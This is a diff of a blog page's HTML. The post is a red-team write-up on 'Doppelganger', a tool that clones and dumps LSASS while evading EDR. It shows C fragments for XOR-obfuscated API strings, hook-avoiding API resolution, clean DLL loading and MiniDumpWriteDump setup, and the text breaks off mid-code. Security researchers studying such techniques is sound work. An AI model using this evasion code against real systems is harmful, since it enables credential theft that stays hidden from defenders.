@@ -1,172 +1,163 @@
 <!DOCTYPE html>
-<html lang="en-us" dir="ltr">
+<html lang="en" data-theme="mocha">
 <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-  
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Doppelganger: Cloning and Dumping LSASS to Evade Detection · vari.sh</title>
+  <meta name="description" content="Technique for cloning and dumping LSASS to evade detection using RTCore64.sys, NtCreateProcessEx and MiniDumpWriteDump.">
 
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="shortcut icon" type="image/png" href="http://localhost:1313/favicon.ico" />
-<meta property="og:url" content="http://localhost:1313/posts/doppelganger/">
-  <meta property="og:site_name" content="vari.sh&#39;s Blog">
+  
+  <meta property="og:type" content="article">
   <meta property="og:title" content="Doppelganger: Cloning and Dumping LSASS to Evade Detection">
   <meta property="og:description" content="Technique for cloning and dumping LSASS to evade detection using RTCore64.sys, NtCreateProcessEx and MiniDumpWriteDump.">
-  <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-04-03T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-04-03T00:00:00+00:00">
-    <meta property="article:tag" content="Red Teaming">
-    <meta property="article:tag" content="Windows Security">
-    <meta property="article:tag" content="Detection Bypass">
-    <meta property="article:tag" content="RTCore64">
-    <meta property="article:tag" content="LSASS">
-
-<title>vari.sh&#39;s Blog | Doppelganger: Cloning and Dumping LSASS to Evade Detection</title>
-
-    <link rel="stylesheet" href="/css/main.css">
+  <meta property="og:url" content="http://localhost:1313/posts/doppelganger/">
   
-      <link rel="stylesheet" href="/css/palette/catpuccin.css">
 
-      <script src="/js/main.js"></script>
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Doppelganger: Cloning and Dumping LSASS to Evade Detection">
 
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+  
+  <link rel="canonical" href="http://localhost:1313/posts/doppelganger/">
+
+  
+  
+
+  
+  
+  <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  
+
+  
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+
+  
+  
+
+  
 
 </head>
+<body>
 
-  
-<body
-    class="dark"
->
-  
-  <main>
-    
-  <div class="container pt-5">
-    <div class="row mt-5 pt-5">
-      
-  <nav aria-label="breadcrumb" class="small">
-    <ol class="breadcrumb fw-bold">
-    <li class="breadcrumb-item">
-      <a href="/"
+  <header class="site-header" role="banner">
+  <div class="container--wide">
+    <div class="header-inner">
+
+      <a href="/" class="site-logo" aria-label="vari.sh">
+        <span class="logo-icon" aria-hidden="true">🧙‍♂️</span>
+        <span>vari.sh</span>
+      </a>
+
+      <nav class="site-nav" id="site-nav" aria-label="Navigazione principale">
         
-      >home</a>
-      
-    </li>
-    <li class="breadcrumb-item">
-      <a href="/posts/"
-        class="text-decoration-underline link-offset-3"
+          <a href="/" class="nav-link">
+            Home
+          </a>
         
-      >posts</a>
-      
-    </li>
-    <li class="breadcrumb-item">
-      <a href="https://github.com/vari-sh"
+          <a href="/posts/" class="nav-link">
+            Posts
+          </a>
         
-          target="_blank" rel="noopener noreferrer"
+          <a href="/tags/" class="nav-link">
+            Tags
+          </a>
         
-      >github</a>
-      
-    </li>
-    </ol>
-  </nav>
+          <a href="/#about" class="nav-link">
+            About
+          </a>
+        
+          <a href="https://github.com/vari-sh" class="nav-link">
+            GitHub
+          </a>
+        
+      </nav>
+
+      <div class="header-actions">
+        
+
+        <button class="btn-icon" id="theme-toggle" aria-label="Toggle theme" title="Toggle theme">
+          ☀️
+        </button>
+
+        
+
+        <button class="mobile-toggle" id="mobile-toggle" aria-label="Open menu" aria-expanded="false" aria-controls="site-nav">
+          <span></span><span></span><span></span>
+        </button>
+      </div>
 
     </div>
+  </div>
+
+  
+  
+  <div style="position:absolute;bottom:0;left:0;right:0;height:2px;background:var(--border-subtle);">
+    <div id="reading-progress" style="height:100%;background:linear-gradient(90deg,var(--mauve),var(--blue));width:0;transition:width 0.1s;"></div>
+  </div>
+  
+</header>
+
+
+  <main id="main-content">
     
-    <div class="d-none d-lg-block position-fixed end-0 small toc">
-      <p class="toc-title">
-        Table of Contents:
-      </p>
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#author-varish">Author: vari.sh</a></li>
-    <li><a href="#what-is-lsass">What is LSASS?</a></li>
-    <li><a href="#does-dumping-lsass-still-make-sense-in-2025">Does Dumping LSASS Still Make Sense in 2025?</a>
-      <ul>
-        <li><a href="#evolved-defenses">Evolved Defenses</a></li>
-        <li><a href="#still-relevantwith-the-right-techniques">Still Relevant—With the Right Techniques</a></li>
-        <li><a href="#a-tool-in-the-toolbox">A Tool in the Toolbox</a></li>
-        <li><a href="#conclusion">Conclusion</a></li>
-      </ul>
-    </li>
-    <li><a href="#ppl-vbs-and-credential-guard">PPL, VBS, and Credential Guard</a>
-      <ul>
-        <li><a href="#protected-process-light-ppl">Protected Process Light (PPL)</a></li>
-        <li><a href="#virtualization-based-security-vbs">Virtualization-Based Security (VBS)</a></li>
-        <li><a href="#credential-guard">Credential Guard</a></li>
-        <li><a href="#why-these-protections-matter">Why These Protections Matter</a></li>
-      </ul>
-    </li>
-    <li><a href="#doppelganger-technique-overview">Doppelganger Technique Overview</a>
-      <ul>
-        <li><a href="#why-it-works">Why It Works</a></li>
-        <li><a href="#tool-philosophy">Tool Philosophy</a></li>
-      </ul>
-    </li>
-    <li><a href="#project-structure">Project Structure</a>
-      <ul>
-        <li><a href="#design-philosophy">Design Philosophy</a></li>
-        <li><a href="#highlights">Highlights</a></li>
-      </ul>
-    </li>
-    <li><a href="#how-doppelganger-works">How Doppelganger works</a>
-      <ul>
-        <li><a href="#api-resolution-with-obfuscation">API Resolution with Obfuscation</a></li>
-        <li><a href="#token-manipulation">Token Manipulation</a></li>
-        <li><a href="#disabling-and-restoring-ppl-protection">Disabling and Restoring PPL Protection</a></li>
-        <li><a href="#cloning-lsass">Cloning LSASS</a></li>
-        <li><a href="#creating-and-encrypting-lsass-dump">Creating and Encrypting LSASS Dump</a></li>
-      </ul>
-    </li>
-    <li><a href="#bonus-hollowreaper--advanced-process-hollowing">Bonus: HollowReaper – Advanced Process Hollowing</a>
-      <ul>
-        <li><a href="#high-level-steps">High-Level Steps</a></li>
-        <li><a href="#1-create-suspended-process">1. Create Suspended Process</a></li>
-        <li><a href="#2-xor-deobfuscate-shellcode">2. XOR-Deobfuscate Shellcode</a></li>
-        <li><a href="#3-create-executable-section">3. Create Executable Section</a></li>
-        <li><a href="#4-map-section-in-both-processes">4. Map Section in Both Processes</a></li>
-        <li><a href="#5-modify-thread-context-rip--shellcode">5. Modify Thread Context (RIP → shellcode)</a></li>
-        <li><a href="#6-resume-and-execute">6. Resume and Execute</a></li>
-        <li><a href="#why-its-more-stealthy">Why It’s More Stealthy</a></li>
-        <li><a href="#api-obfuscation">API Obfuscation</a></li>
-        <li><a href="#summary">Summary</a></li>
-      </ul>
-    </li>
-    <li><a href="#limitations">Limitations</a>
-      <ul>
-        <li><a href="#credential-guard-may-still-block-some-secrets">Credential Guard May Still Block Some Secrets</a></li>
-        <li><a href="#requires-vulnerable-driver-rtcore64sys">Requires Vulnerable Driver (<code>RTCore64.sys</code>)</a></li>
-        <li><a href="#shellcode-loader-requires-donut-compatible-payload">Shellcode Loader Requires Donut-Compatible Payload</a></li>
-        <li><a href="#requires-os-specific-offsets">Requires OS-Specific Offsets</a></li>
-        <li><a href="#still-requires-system-privileges">Still Requires SYSTEM Privileges</a></li>
-        <li><a href="#dump-still-lands-on-disk-unless-modified">Dump Still Lands on Disk (Unless Modified)</a></li>
-        <li><a href="#not-a-silver-bullet">Not a Silver Bullet</a></li>
-      </ul>
-    </li>
-    <li><a href="#tldr">TL;DR</a></li>
-    <li><a href="#conclusion-1">Conclusion</a></li>
-    <li><a href="#disclaimer">Disclaimer</a></li>
-    <li><a href="#references">References</a></li>
-  </ul>
-</nav>
-    </div>
-    
-    <div class="post">
-      <header class="mb-4">
-        <h1 class="text-uppercase">Doppelganger: Cloning and Dumping LSASS to Evade Detection</h1>
+<article class="post-single">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta">
+        <time class="post-date" datetime="2025-04-03">
+          03 April 2025
+        </time>
         
         
-        <div aria-label="breadcrumb">
-          <ol class="breadcrumb">
-            <li class="breadcrumb-item small">
-              <time datetime="2025-04-03T00:00:00&#43;00:00">April 3, 2025</time>
-            </li>
-            <li class="breadcrumb-item small">
-              26 minutes
-            </li>
-          </ol>
+        <a href="/tags/red-teaming" class="post-tag">red teaming</a>
+        
+        <a href="/tags/windows-security" class="post-tag">windows security</a>
+        
+        <a href="/tags/detection-bypass" class="post-tag">Detection bypass</a>
+        
+        <a href="/tags/rtcore64" class="post-tag">RTCore64</a>
+        
+        <a href="/tags/lsass" class="post-tag">LSASS</a>
+        
+      </div>
+
+      <h1 class="post-title">Doppelganger: Cloning and Dumping LSASS to Evade Detection</h1>
+
+      
+      <p class="post-description">Technique for cloning and dumping LSASS to evade detection using RTCore64.sys, NtCreateProcessEx and MiniDumpWriteDump.</p>
+      
+
+      
+      
+        
+          
+        
+      
+      
+      <div class="post-author">
+        <div class="author-avatar" aria-hidden="true">
+          V
         </div>
-      </header>
-      <article>
-        <h1 id="doppelganger-an-advanced-lsass-dumper-with-process-cloning">Doppelganger: An Advanced LSASS Dumper with Process Cloning</h1>
+        <div class="author-info">
+          <span class="author-name">vari.sh</span>
+          <span class="author-role">Author</span>
+        </div>
+      </div>
+      
+    </header>
+
+    
+    
+
+    
+    <div class="post-content">
+      <h1 id="doppelganger-an-advanced-lsass-dumper-with-process-cloning">Doppelganger: An Advanced LSASS Dumper with Process Cloning</h1>
 <h2 id="author-varish">Author: vari.sh</h2>
 <hr>
 <p><img src="/images/doppelganger.png" alt="Doppelganger"></p>
@@ -237,26 +228,26 @@
 <h3 id="why-these-protections-matter">Why These Protections Matter</h3>
 <p>For defenders, PPL + VBS + Credential Guard form a <strong>layered defense</strong>:</p>
 <table>
-<thead>
-<tr>
-<th>Protection Layer</th>
-<th>Goal</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>PPL</strong></td>
-<td>Prevent memory access to LSASS</td>
-</tr>
-<tr>
-<td><strong>VBS</strong></td>
-<td>Enforce memory isolation via virtualization</td>
-</tr>
-<tr>
-<td><strong>Credential Guard</strong></td>
-<td>Move secrets outside attacker-accessible memory</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>Protection Layer</th>
+          <th>Goal</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>PPL</strong></td>
+          <td>Prevent memory access to LSASS</td>
+      </tr>
+      <tr>
+          <td><strong>VBS</strong></td>
+          <td>Enforce memory isolation via virtualization</td>
+      </tr>
+      <tr>
+          <td><strong>Credential Guard</strong></td>
+          <td>Move secrets outside attacker-accessible memory</td>
+      </tr>
+  </tbody>
 </table>
 <p>But for red teamers and attackers, these are <strong>barriers to bypass</strong>. Standard memory-dumping tools will fail. Instead, advanced techniques—like <strong>cloning LSASS</strong>, accessing physical memory, or using vulnerable drivers—are needed.</p>
 <p>These mechanisms raise the bar for credential theft, but as history shows, <strong>defense never stops exploitation—it only slows it down</strong>.</p>
@@ -356,55 +347,55 @@
 </ul>
 <h4 id="xor-obfuscated-api-strings">XOR-Obfuscated API Strings</h4>
 <p>API names are stored in <code>api_strings.h</code> as <strong>byte arrays encrypted with XOR</strong>, using a custom key (e.g., <code>XOR_KEY</code>). Here&rsquo;s an example for <code>&quot;Process32FirstW&quot;</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c6a0f6">static</span> <span style="color:#c6a0f6">const</span> <span style="color:#ed8796">unsigned</span> <span style="color:#ed8796">char</span> P32F_ENC[] <span style="color:#91d7e3;font-weight:bold">=</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#f5a97f">0x60</span>, <span style="color:#f5a97f">0x43</span>, <span style="color:#f5a97f">0x5D</span>, <span style="color:#f5a97f">0x50</span>, <span style="color:#f5a97f">0x51</span>, <span style="color:#f5a97f">0x46</span>, <span style="color:#f5a97f">0x45</span>, <span style="color:#f5a97f">0x04</span>, <span style="color:#f5a97f">0x0A</span>, <span style="color:#f5a97f">0x7F</span>, <span style="color:#f5a97f">0x08</span>, <span style="color:#f5a97f">0x10</span>, <span style="color:#f5a97f">0x10</span>, <span style="color:#f5a97f">0x10</span>, <span style="color:#f5a97f">0x32</span>
-</span></span><span style="display:flex;"><span>};
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">P32F_ENC</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x32</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
 </span></span></code></pre></div><p>These are decrypted at runtime using a simple XOR routine:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> <span style="color:#8aadf4">xor_decrypt_string</span>(<span style="color:#c6a0f6">const</span> <span style="color:#ed8796">unsigned</span> <span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> enc, <span style="color:#ed8796">size_t</span> len, <span style="color:#c6a0f6">const</span> <span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> key, <span style="color:#ed8796">size_t</span> key_len) {
-</span></span><span style="display:flex;"><span>    <span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> out <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">malloc</span>(len <span style="color:#91d7e3;font-weight:bold">+</span> <span style="color:#f5a97f">1</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">if</span> (<span style="color:#91d7e3;font-weight:bold">!</span>out) <span style="color:#c6a0f6">return</span> <span style="color:#91d7e3">NULL</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">for</span> (<span style="color:#ed8796">size_t</span> i <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#f5a97f">0</span>; i <span style="color:#91d7e3;font-weight:bold">&lt;</span> len; i<span style="color:#91d7e3;font-weight:bold">++</span>)
-</span></span><span style="display:flex;"><span>        out[i] <span style="color:#91d7e3;font-weight:bold">=</span> enc[i] <span style="color:#91d7e3;font-weight:bold">^</span> key[i <span style="color:#91d7e3;font-weight:bold">%</span> key_len];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    out[len] <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#a6da95">&#39;\0&#39;</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">return</span> out;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span><span class="o">*</span> <span class="nf">xor_decrypt_string</span><span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">enc</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">out</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">out</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h4 id="dynamic-resolution-via-customgetprocaddress">Dynamic Resolution via CustomGetProcAddress</h4>
 <p>Once decrypted, API names are resolved using a <strong>custom implementation of <code>GetProcAddress</code></strong>, which operates on <strong>manually loaded clean DLLs</strong> (bypassing IAT hooks introduced by security products):</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ed8796">void</span><span style="color:#91d7e3;font-weight:bold">*</span> <span style="color:#8aadf4">CustomGetProcAddress</span>(HMODULE hModule, <span style="color:#c6a0f6">const</span> <span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> name);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="nf">CustomGetProcAddress</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">name</span><span class="p">);</span>
 </span></span></code></pre></div><p>This approach avoids using the default <code>GetProcAddress</code>, which might be hooked by EDRs or monitored for specific API resolution patterns.</p>
 <h4 id="runtime-resolution-wrapper">Runtime Resolution Wrapper</h4>
 <p>To encapsulate the logic, the tool uses a single function to resolve and assign APIs:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#8aadf4">ResolveApiFromDll</span>(HMODULE hMod, <span style="color:#c6a0f6">const</span> <span style="color:#ed8796">unsigned</span> <span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> enc, <span style="color:#ed8796">size_t</span> len, <span style="color:#ed8796">void</span><span style="color:#91d7e3;font-weight:bold">**</span> fn) {
-</span></span><span style="display:flex;"><span>    <span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> name <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">xor_decrypt_string</span>(enc, len, XOR_KEY, key_len);
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">if</span> (<span style="color:#91d7e3;font-weight:bold">!</span>name) <span style="color:#c6a0f6">return</span> FALSE;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#91d7e3;font-weight:bold">*</span>fn <span style="color:#91d7e3;font-weight:bold">=</span> (<span style="color:#ed8796">void</span><span style="color:#91d7e3;font-weight:bold">*</span>)<span style="color:#8aadf4">CustomGetProcAddress</span>(hMod, name);
-</span></span><span style="display:flex;"><span>    <span style="color:#8aadf4">free</span>(name);
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">return</span> (<span style="color:#91d7e3;font-weight:bold">*</span>fn <span style="color:#91d7e3;font-weight:bold">!=</span> <span style="color:#91d7e3">NULL</span>);
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">ResolveApiFromDll</span><span class="p">(</span><span class="n">HMODULE</span> <span class="n">hMod</span><span class="p">,</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">enc</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">void</span><span class="o">**</span> <span class="n">fn</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">name</span> <span class="o">=</span> <span class="nf">xor_decrypt_string</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">XOR_KEY</span><span class="p">,</span> <span class="n">key_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">name</span><span class="p">)</span> <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">fn</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="nf">CustomGetProcAddress</span><span class="p">(</span><span class="n">hMod</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="o">*</span><span class="n">fn</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>This function is used for all core Windows APIs (NTDLL, KERNEL32, ADVAPI32, etc.) and also system calls not exposed via the Windows API.</p>
 <h4 id="clean-dll-loading">Clean DLL Loading</h4>
 <p>To avoid calling Windows APIs that might be hooked, Doppelganger <strong>manually loads clean DLLs</strong> from disk using LoadLibraryA:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HMODULE <span style="color:#8aadf4">LoadCleanDLL</span>(<span style="color:#ed8796">char</span><span style="color:#91d7e3;font-weight:bold">*</span> dllPath) {
-</span></span><span style="display:flex;"><span>    HMODULE hDLL <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">LoadLibraryA</span>(dllPath);
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">return</span> hDLL;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HMODULE</span> <span class="nf">LoadCleanDLL</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">dllPath</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HMODULE</span> <span class="n">hDLL</span> <span class="o">=</span> <span class="nf">LoadLibraryA</span><span class="p">(</span><span class="n">dllPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hDLL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>This ensures the DLL memory region is untouched by EDR hooks or user-mode callbacks, giving a more trustworthy view of function exports.</p>
 <hr>
 <h4 id="example-resolving-minidumpwritedump">Example: Resolving <code>MiniDumpWriteDump</code></h4>
 <p>Here’s a real-world usage snippet for resolving and using <code>MiniDumpWriteDump</code> (DbgHelp):</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// &#34;MiniDumpWriteDump&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#c6a0f6">static</span> <span style="color:#c6a0f6">const</span> <span style="color:#ed8796">unsigned</span> <span style="color:#ed8796">char</span> MDWD_ENC[] <span style="color:#91d7e3;font-weight:bold">=</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#f5a97f">0x7D</span>, <span style="color:#f5a97f">0x58</span>, <span style="color:#f5a97f">0x5C</span>, <span style="color:#f5a97f">0x5A</span>, <span style="color:#f5a97f">0x70</span>, <span style="color:#f5a97f">0x40</span>, <span style="color:#f5a97f">0x5B</span>, <span style="color:#f5a97f">0x47</span>, <span style="color:#f5a97f">0x6F</span>, <span style="color:#f5a97f">0x4B</span>, <span style="color:#f5a97f">0x08</span>, <span style="color:#f5a97f">0x16</span>, <span style="color:#f5a97f">0x06</span>, <span style="color:#f5a97f">0x20</span>, <span style="color:#f5a97f">0x10</span>, <span style="color:#f5a97f">0x0B</span>, <span style="color:#f5a97f">0x17</span>
-</span></span><span style="display:flex;"><span>};
-</span></span><span style="display:flex;"><span><span style="color:#ed8796">void</span><span style="color:#91d7e3;font-weight:bold">*</span> pMDWD <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#91d7e3">NULL</span>;
-</span></span><span style="display:flex;"><span>HMODULE hDbghelp <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">LoadCleanDLL</span>(<span style="color:#a6da95">&#34;dbghelp.dll&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">ResolveApiFromDll</span>(hDbghelp, MDWD_ENC, <span style="color:#c6a0f6">sizeof</span>(MDWD_ENC), <span style="color:#91d7e3;font-weight:bold">&amp;</span>pMDWD);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Call it later:
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">pMDWD</span>(hClone, pid, <span style="color:#91d7e3">NULL</span>, MiniDumpWithFullMemory, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3;font-weight:bold">&amp;</span>mci);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// &#34;MiniDumpWriteDump&#34;
+</span></span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">MDWD_ENC</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x17</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="n">pMDWD</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">HMODULE</span> <span class="n">hDbghelp</span> <span class="o">=</span> <span class="nf">LoadCleanDLL</span><span class="p">(</span><span class="s">&#34;dbghelp.dll&#34;</span><span class="p">);</span>
